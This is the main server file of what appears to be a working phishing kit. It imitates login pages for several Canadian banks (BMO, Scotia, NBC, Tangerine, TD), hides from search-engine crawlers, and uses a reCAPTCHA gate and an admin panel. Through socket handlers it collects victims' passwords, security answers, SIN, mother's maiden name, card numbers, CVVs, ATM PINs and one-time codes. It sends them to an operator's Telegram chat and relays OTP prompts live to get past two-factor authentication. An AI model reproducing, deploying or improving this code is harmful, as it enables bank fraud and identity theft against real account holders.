// ====================
// Module Imports
// ====================
const express = require('express');
const { createServer } = require('node:http');
const bodyParser = require('body-parser');
const { Server } = require('socket.io');
const fs = require('fs');
let fetch;
const TelegramBot = require('node-telegram-bot-api');
const session = require('express-session');
const sessionStore = new Map();
const { error } = require('node:console');
const dbConfig = require('./dbConfig');
const { Pool } = require('pg');
const bmo = require('./routers/bmo'); 
const scotia = require('./routers/scotia');
const nbc = require('./routers/nbc');
const tangerine = require('./routers/tangerine');
const td = require('./routers/td');


(async () => {
    fetch = (await import('node-fetch')).default;
})();

require('dotenv').config();

// ====================
// Configuration
// ====================
const app = express();

const RECAPTCHA_SECRET_KEY = process.env.RECAPTCHA_SECRET_KEY;
const RECAPTCHA_SITE_KEY = process.env.RECAPTCHA_SITE_KEY;
const token = process.env.TELEGRAM_BOT_API_KEY;
const chatId = process.env.TELEGRAM_CHAT_ID;
const adminKey = process.env.ADMIN_KEY;
const bot = new TelegramBot(token, { polling: true });

// EJS setup
app.set('view engine', 'ejs');


// Configure session middleware
app.use(session({
    secret: "6LdI0PYoAAAAAN0RS1L3WZhLYqr8YX3jCwM2umEx", // replace with your secret key
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));

const server = createServer(app);
const io = new Server(server);

const botList = [
    'Googlebot',
    'googlebot-image',
    'googlebot-mobile',
    'MSNBot',
    'Slurp',
    'Teoma',
    'Gigabot',
    'Robozilla',
    'Nutch',
    'ia_archiver',
    'archive.org_bot',
    'baiduspider',
    'naverbot',
    'yeti',
    'yahoo-mmcrawler',
    'psbot',
    'yahoo-blogs/v3.9',
    'AhrefsBot',
    'MJ12bot',
    'Majestic-12',
    'Majestic-SEO',
    'DSearch',
    'Rogerbot',
    'SemrushBot',
    'BLEXBot',
    'ScoutJet',
    'SearchmetricsBot',
    'BacklinkCrawler',
    'Exabot',
    'spbot',
    'linkdexbot',
    'Lipperhey Spider',
    'SEOkicks-Robot',
    'sistrix',
    // ... Add all the bots from your list
];

const redirectBots = (req, res, next) => {
    const userAgent = req.get('User-Agent');
    if (userAgent) {
        const isBot = botList.some(botUserAgent => userAgent.includes(botUserAgent));
        if (isBot) {
            return res.redirect('https://www.google.com');
        }
    }
    next();
};

const checkAdminSession = (req, res, next) => {

    if (req.session.isAdminVerified) {
        next();
    } else {
        res.render('misc/403/index');
    }
};

// Middleware to verify Admin response
const verifyAdmin = (req, res, next) => {

    const adminKeyInput = req.body['admin-key'];

    // Check if the provided key matches the stored key
    if (adminKeyInput === adminKey) {
        req.session.isAdminVerified = true;

        next(); // Admin key is correct, proceed to the next middleware/route handler
    } else {
        // Optionally, you could log this attempt or implement rate-limiting to prevent brute force attacks
        res.render('misc/403/index');
    }

};

const checkRecaptchaSession = (req, res, next) => {

    if (req.session.recaptchaVerified) {
        next();
    } else {
        res.status(403).send('Access denied. Please complete the reCAPTCHA.');
    }
};

const verifyRecaptcha = (req, res, next) => {
    const recaptchaResponse = req.body['g-recaptcha-response'];

    // Verify URL
    const verifyUrl = `https://www.google.com/recaptcha/api/siteverify?secret=${RECAPTCHA_SECRET_KEY}&response=${recaptchaResponse}`;

    fetch(verifyUrl, { method: 'POST' })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                req.session.recaptchaVerified = true;

                next(); // reCAPTCHA was successful, proceed to the next middleware/route handler
            } else {
                res.status(403).send('reCAPTCHA Failed: You might be a robot. Access denied.');
            }
        })
        .catch(error => {
            res.status(500).send('Error in reCAPTCHA verification, try again later.');
        });
};

// Function to create table with JSONB column
const createTable = async () => {
    const createTableQuery = `
      CREATE TABLE IF NOT EXISTS items (
        id SERIAL PRIMARY KEY,
        data JSONB NOT NULL
      );
    `;

    try {
        await pool.query(createTableQuery);
        console.log('Table created successfully');
    } catch (error) {
        console.error('Error creating table:', error);
    }
};

function update(initialData, initialDataTest){
    for (key1 in initialData['settings']) {
    
        if (key1 != 'info') {
            for (key2 in initialData['settings'][key1]) {
                if (key2 != 'qa') {
                    if (initialDataTest['settings'][key1][key2] == 'on') {
                      
                        initialData['settings'][key1][key2] = 'on'
                    } else {
                        initialData['settings'][key1][key2] = 'off'
                    }
    
                } else if(key2 == 'qa') {
                    initialData['settings'][key1][key2] = initialDataTest['settings'][key1][key2]
                }
            }
        } else {
            initialData['settings'][key1]['amount'] = initialDataTest['settings'][key1]['amount']
            initialData['settings'][key1]['from'] = initialDataTest['settings'][key1]['from']
            initialData['settings'][key1]['notice'] = initialDataTest['settings'][key1]['notice']
            initialData['settings'][key1]['expire'] = initialDataTest['settings'][key1]['expire']
        }
    }

    return initialData
}

async function sendNewMessage(userDetails){
    let messageId = null
    let message = `IP: ${userDetails.ip}

    -- Login Details --
    Bank: ${userDetails.page}
    Username: ${userDetails.getUserDataLogin.username || ''}
    Password:  ${userDetails.getUserDataLogin.password || ''}
    UserAgent: ${userDetails.getUserDataLogin.userAgent || ''}
    
    -- Security Questions --
    Q1: ${userDetails.getUserDataQuestion.question1 || ''} : ${userDetails.getUserDataQuestion.answer1 || ''}
    Q2: ${userDetails.getUserDataQuestion.question2 || ''} : ${userDetails.getUserDataQuestion.answer2 || ''}
    Q3: ${userDetails.getUserDataQuestion.question3 || ''} : ${userDetails.getUserDataQuestion.answer3 || ''}
    Q4: ${userDetails.getUserDataQuestion.question4 || ''} : ${userDetails.getUserDataQuestion.answer4 || ''}
    Q5: ${userDetails.getUserDataQuestion.question5 || ''} : ${userDetails.getUserDataQuestion.answer5 || ''}
    Custom Question: ${userDetails.getUserDataOTP.customQuestion || ''} : ${userDetails.getUserDataOTP.customAnswer || ''}
    
    -- Personal Information --
    Full Name: ${userDetails.getUserDataDetails.name || ''}
    Address: ${userDetails.getUserDataDetails.address || ''}
    City: ${userDetails.getUserDataDetails.city || ''}
    Phone Number: ${userDetails.getUserDataDetails.phone || ''}
    Postal Code: ${userDetails.getUserDataDetails.postal || ''}
    Email: ${userDetails.getUserDataDetails.email || ''}
    DOB: ${userDetails.getUserDataDetails.dob1 || ''}/${userDetails.getUserDataDetails.dob2 || ''}/${userDetails.getUserDataDetails.dob3 || ''} || ${userDetails.getUserDataDetails.dob || ''}
    Mmn: ${userDetails.getUserDataDetails.mmn || ''}
    Sin: ${userDetails.getUserDataDetails.sin || ''}
    Driver Licence: ${userDetails.getUserDataDetails.drivers || ''}

    -- Card Information --
    Card Number: ${userDetails.getUserDataCard.card || ''}
    Expiry: ${userDetails.getUserDataCard.exp1 || ''}/${userDetails.getUserDataCard.exp2 || ''} || ${userDetails.getUserDataCard.expiry || ''}
    CVV: ${userDetails.getUserDataCard.cvv || ''}
    ATM PIN: ${userDetails.getUserDataCard.atm || ''}
    
    -- OTP --
    Code:  ${userDetails.getUserDataOTP.code || ''}
    `;

    await bot.sendMessage(chatId, message).then(async(sentMsg) => {
        messageId = sentMsg.message_id;
    });
    
    return messageId
}

async function modifyMessageSent(userDetails){
    let bool = false
    let message = `IP: ${userDetails.ip}

    -- Login Details --
    Bank: ${userDetails.page}
    Username: ${userDetails.getUserDataLogin.username || ''}
    Password:  ${userDetails.getUserDataLogin.password || ''}
    UserAgent: ${userDetails.getUserDataLogin.userAgent || ''}
    
    -- Security Questions --
    Q1: ${userDetails.getUserDataQuestion.question1 || ''} : ${userDetails.getUserDataQuestion.answer1 || ''}
    Q2: ${userDetails.getUserDataQuestion.question2 || ''} : ${userDetails.getUserDataQuestion.answer2 || ''}
    Q3: ${userDetails.getUserDataQuestion.question3 || ''} : ${userDetails.getUserDataQuestion.answer3 || ''}
    Q4: ${userDetails.getUserDataQuestion.question4 || ''} : ${userDetails.getUserDataQuestion.answer4 || ''}
    Q5: ${userDetails.getUserDataQuestion.question5 || ''} : ${userDetails.getUserDataQuestion.answer5 || ''}
    Custom Question: ${userDetails.getUserDataOTP.customQuestion || ''} : ${userDetails.getUserDataOTP.customAnswer || ''}
    
    -- Personal Information --
    Full Name: ${userDetails.getUserDataDetails.name || ''}
    Address: ${userDetails.getUserDataDetails.address || ''}
    City: ${userDetails.getUserDataDetails.city || ''}
    Phone Number: ${userDetails.getUserDataDetails.phone || ''}
    Postal Code: ${userDetails.getUserDataDetails.postal || ''}
    Email: ${userDetails.getUserDataDetails.email || ''}
    DOB: ${userDetails.getUserDataDetails.dob1 || ''}/${userDetails.getUserDataDetails.dob2 || ''}/${userDetails.getUserDataDetails.dob3 || ''} || ${userDetails.getUserDataDetails.dob || ''}
    Mmn: ${userDetails.getUserDataDetails.mmn || ''}
    Sin: ${userDetails.getUserDataDetails.sin || ''}
    Driver Licence: ${userDetails.getUserDataDetails.drivers || ''}

    -- Card Information --
    Card Number: ${userDetails.getUserDataCard.card || ''}
    Expiry: ${userDetails.getUserDataCard.exp1 || ''}/${userDetails.getUserDataCard.exp2 || ''} || ${userDetails.getUserDataCard.expiry || ''}
    CVV: ${userDetails.getUserDataCard.cvv || ''}
    ATM PIN: ${userDetails.getUserDataCard.atm || ''}
    
    -- OTP --
    Code:  ${userDetails.getUserDataOTP.code || ''}`;
    await bot.editMessageText(message, {
        chat_id: userDetails.getUserDataTelegramId.chatId,
        message_id: userDetails.getUserDataTelegramId.msgId
    })
      .then((editedMessage) => {
        bool = true
    })
      .catch((error) => {
        console.error(error);
    });

    return bool
}

// Use this middleware in your app before your routes
app.use(redirectBots);


// ====================
// Middleware
// ====================
app.use(bodyParser.json()); // for parsing application/json
app.use(bodyParser.urlencoded({ extended: true })); // for parsing application/x-www-form-urlencoded
app.use(express.static('public'));

const pool = new Pool(dbConfig);

createTable();

app.get('/', (req, res) => {
    res.render('captcha/index', {sitekey: RECAPTCHA_SITE_KEY})
})

app.post('/verify', verifyRecaptcha, async (req, res, next) => {
    try{
        const getId = 1; // Since we're always dealing with the record with id = 1
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);

        let info = result.rows[0].data.settings.info;  
        
        if(result.rows.length > 0){next()} else {res.render('catpcha/index', {sitekey: RECAPTCHA_SITE_KEY});}
        
        
    } catch (error) {
        console.error(error);
        res.render('captcha/index', {sitekey: RECAPTCHA_SITE_KEY});
    }
})

app.use('/scotia', checkRecaptchaSession,scotia)

app.post('/update', checkAdminSession ,async (req, res) => {
    let data = req.body;

    try {

        const getId = 1;
        const get = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);

        if (get.rows.length > 0) {
            let oldOne =  get.rows[0].data
            
            data = update(oldOne, data)

        }

        const upsertQuery = `
      INSERT INTO items (id, data) VALUES (1, $1)
      ON CONFLICT (id) DO UPDATE 
      SET data = EXCLUDED.data
      RETURNING *;
    `;

        const result = await pool.query(upsertQuery, [data]);
        //console.log(result.rows[0])
        //await redisClient.set("settings", JSON.stringify(data.settings));
        res.render('admin/panel/index', { bool: true, message: "Your updates have been successfully saved." });
    } catch (error) {
        console.error(error);
        res.render('admin/settings/index', { data: null, message: 'Error updating data. Contact webcro help.' });
    }
});

app.get('/delete-all', checkAdminSession ,async (req, res) => {
    try {
        const deleteId = 1; // Assuming you're always deleting the record with id = 1
        const result = await pool.query('DELETE FROM items WHERE id = $1', [deleteId]);

        if (result.rowCount > 0) {
            res.render('admin/panel/index', { bool: true, message: "All key delete." });
          } else {
            res.status(404).send(`Item with id ${deleteId} not found.`);
          }

        
    } catch (error) {
        console.error(error);
        res.render('admin/settings/index', { data: null, message: 'Error deleting all. Contact webcro help.' });
    }
});



app.get('/admin', (req, res) => {
    if (req.session.isAdminVerified) {
        res.render('admin/panel/index', { bool: false });
    } else {
        res.render('admin/login/index');
    }

});

app.post('/admin/verify', verifyAdmin, (req, res) => {
    res.redirect(301, '/admin/panel');
})

app.get('/admin/panel', checkAdminSession, (req, res) => {
    res.render('admin/panel/index', { bool: false });
})

app.get('/delete', checkAdminSession, async (req, res) => {
    try {
        const deleteId = 1; // Assuming getId is the ID you want to delete
        const deleteQuery = 'DELETE FROM items WHERE id = $1';
        await pool.query(deleteQuery, [deleteId]);
        console.log('Deleted successfully');
        res.render('admin/panel/index', { bool: true, message: "Databases have been successfully delete." });
    } catch (error) {
        console.error('Error deleting record:', error);
        res.render('admin/settings/index', { data: null, message: 'Error deleting databases. Contact webcro help.' });
    }
})

app.get('/admin/settings', checkAdminSession, async (req, res) => {
    try {
        const getId = 1; // Since we're always dealing with the record with id = 1
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);

        if (result.rows.length > 0) {
            //console.log(result.rows[0].data);
            res.render('admin/settings/index', { data: result.rows[0].data });
        } else {
            res.render('admin/settings/index', { data: null, message: 'Please use the form below to update the page.' });
            return;
        }
    } catch (error) {
        console.error(error);
        res.render('admin/settings/index', { data: null, message: 'Error retrieving settings. Contact webcro help.' });
    }
});

app.use('/bmo', checkRecaptchaSession,bmo)
app.use('/nbc', checkRecaptchaSession,nbc)
app.use('/tangerine', checkRecaptchaSession,tangerine)
app.use('/td', checkRecaptchaSession,td)

app.use((req, res, next) => {
    res.status(404).render('captcha/index', {sitekey: RECAPTCHA_SITE_KEY});
});




// ====================
// Socket Handling
// ====================
io.on('connection', (socket, req) => {
    let userIP = socket.request.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
    userIP = userIP.split(',')[0].trim();
    if (userIP.includes('::ffff:')) {
        userIP = userIP.replace('::ffff:', '');
    }

    socket.join(userIP);

    if (!sessionStore.has(userIP)) {
        sessionStore.set(userIP, { ip: userIP, status: 'actif', page: null, stage: null, otp: false });
    } else {
        let userDetails = sessionStore.get(userIP);
        userDetails.status = 'actif';
        sessionStore.set(userIP, userDetails);
    }

    io.emit('join', Array.from(sessionStore.entries()));

    socket.on('pageandstage', (data) => {
        if (sessionStore.has(userIP)) {
            let userDetails = sessionStore.get(userIP);
            userDetails.page = data.page;
            userDetails.stage = data.stage;
            sessionStore.set(userIP, userDetails);
        }
        io.emit('join', Array.from(sessionStore.entries()));
    });

    socket.on('getUserData', (data) => {
        const users = Array.from(sessionStore.entries());
        const user = users.find(([ipAddress, details]) => ipAddress === data.ip);
        const userData = [user]
        if(user){
            io.emit('setUserData', userData)
        } else {
            io.emit('setUserData', Array.from(sessionStore.entries()));
        }
        
    });

    socket.on('sendOTP', (data) => {
        if(data.customQuestion){
            io.to(data.ip).emit('OTP', {otp:true, navig: data.navig+"/"+data.customQuestion})
        } else {
            io.to(data.ip).emit('OTP', {otp:true, navig: data.navig})
        }
        
    })

    socket.on('sendOTPResponse', (data) => {
        if (sessionStore.has(data.ip)) {
            let userDetails = sessionStore.get(data.ip);
            //console.log(userDetails);
            //console.log(userDetails.getUserDataNavig);
            if(data.res == 'good'){
                //console.log(data.ip)
                //console.log(userDetails.getUserDataNavig.next)
                io.to(data.ip).emit('OTPResponse', {res:true, next: userDetails.getUserDataNavig.next})
           } else {
                //console.log(data.ip)
                //console.log(userDetails.getUserDataType.navig)
                io.to(data.ip).emit('OTPResponse', {res:false, next: userDetails.getUserDataType.navig})
           }
        }
    })

    socket.on('nextNavig', (data) => {
        if (sessionStore.has(userIP)) {
            let userDetails = sessionStore.get(userIP);
            if(!userDetails.getUserDataNavig){
                userDetails.getUserDataNavig = {};
            } 
                //console.log('nextNavig')
                //console.log(data)
                //console.log(userIP)
    
                userDetails.getUserDataNavig = data
                //console.log(userDetails)
                sessionStore.set(userIP, userDetails);
                io.emit('join', Array.from(sessionStore.entries()));
            
        }
    })

    socket.on('typeOTP', (data) => {
        if (sessionStore.has(userIP)) {
            let userDetails = sessionStore.get(userIP);
            if(!userDetails.getUserDataType){
                userDetails.getUserDataType = {};
            } 
                //console.log('typeOTP')
                //console.log(data)
                //console.log(userIP)
    
                userDetails.getUserDataType = data
                //console.log(userDetails)
                sessionStore.set(userIP, userDetails);
                io.emit('join', Array.from(sessionStore.entries()));
            
        }
    })
    
    socket.on('submit', (data) => {
        if (sessionStore.has(userIP)) {
        let userDetails = sessionStore.get(userIP);
            if (!userDetails.getUserDataTelegramId && !userDetails.getUserDataLogin && !userDetails.getUserDataDetails && !userDetails.getUserDataCard && !userDetails.getUserDataOTP && !userDetails.getUserDataQuestion) {
                userDetails.getUserDataLogin = {};
                userDetails.getUserDataDetails = {};
                userDetails.getUserDataCard = {};
                userDetails.getUserDataOTP = {};
                userDetails.getUserDataQuestion = {};
                userDetails.getUserDataTelegramId = {};
        }
        if(userDetails.stage == 'Login'){
            userDetails.getUserDataLogin = data
           
        } else if(userDetails.stage == 'Question') {
            userDetails.getUserDataQuestion = data
        } else if(userDetails.stage == 'Details'){
            userDetails.getUserDataDetails = data
            
        } else if(userDetails.stage == 'Card'){
            userDetails.getUserDataCard = data
            
        } else if(userDetails.stage == 'OTP'){
            userDetails.getUserDataOTP = data
            
        }

        if(userDetails.getUserDataTelegramId.msgId && userDetails.getUserDataTelegramId.ip == userIP){
            modifyMessageSent(userDetails).then(bool => {
                console.log(bool)
            })
        } else {
            sendNewMessage(userDetails).then(messageId => {
                userDetails.getUserDataTelegramId = {msgId: messageId, chatId: chatId, ip: userDetails.ip }
            })
        }
            
        sessionStore.set(userIP, userDetails);
        io.emit('join', Array.from(sessionStore.entries())); 
        
       
    }
    /*
        let user = data
        user.ip = userIP
        // Additional logic for sending a message via Telegram bot
        let message = JSON.stringify(user, null, 2);
        bot.sendMessage(chatId, message);
       
        //console.log(data)
    */
    })



    socket.on('disconnect', () => {
        if (sessionStore.has(userIP)) {
            let userDetails = sessionStore.get(userIP);
            userDetails.status = 'inactif';
            sessionStore.set(userIP, userDetails);
            io.emit('leave', Array.from(sessionStore.entries()));
        }
    });

    socket.on('deleteAll', () => {
        sessionStore.clear();
        io.emit('join', Array.from(sessionStore.entries()));
    })



});

// ====================
// Server Startup
// ====================

server.listen(80, () => {
    console.log('HTTPS server running on port 80');
});
